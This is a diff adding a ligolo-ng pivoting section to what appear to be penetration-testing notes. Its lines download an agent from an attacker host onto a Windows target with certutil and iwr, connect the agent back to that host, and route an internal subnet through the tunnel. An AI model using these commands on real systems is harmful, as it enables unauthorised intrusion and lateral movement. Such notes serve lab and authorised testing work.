@@ -2493,3 +2493,35 @@ proxychains -q msfconsole -q
 	[root access is gained to .31]
 
 ```
+
+**ligolo-ng setup**
+```
+[https://github.com/nicocha30/ligolo-ng]
+
+win x64 agent: https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
+
+lin x64 proxy: https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
+
+
+setup:
+
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+
+./proxy -selfcert
+
+python3 -m http.server 443
+	certutil -f -urlcache http://192.168.45.213:443/agent.exe agent.exe
+	iwr -uri http://192.168.45.213:443/agent.exe -o agent.exe
+
+.\agent.exe -connect 192.168.45.213:11601 -ignore-cert
+
+session
+	1 
+
+sudo ip route add 10.10.206.0/24 dev ligolo
+
+start
+
+```
+
